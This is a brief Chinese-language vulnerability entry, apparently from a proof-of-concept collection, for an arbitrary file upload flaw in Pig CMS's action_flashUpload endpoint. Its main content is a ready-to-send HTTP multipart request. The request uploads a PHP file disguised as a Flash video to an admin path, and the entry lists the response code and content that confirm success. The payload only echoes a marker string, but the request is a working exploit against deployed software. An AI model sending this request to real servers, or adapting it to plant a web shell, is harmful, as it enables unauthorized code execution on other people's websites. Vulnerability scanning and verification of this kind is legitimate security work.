﻿# Pig CMS action_flashUpload 接口处任意文件上传漏洞

> 更新时间：2024-03-29

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1
Content-Type: multipart/form-data; boundary=----HUHhuIUHNiugiuIUgbvgfCJH

------HUHhuIUHNiugiuIUgbvgfCJH
Content-Disposition: form-data; name="filePath"; filename="ceshi.php"
Content-Type: video/x-flv

<?php echo "dudesuite";?>
------HUHhuIUHNiugiuIUgbvgfCJH
```

> 响应代码特征：200

> 响应内容特征：.php

> 上传文件定位：

> 验证文件来源：Pig CMS action_flashUpload 接口处任意文件上传漏洞.poc

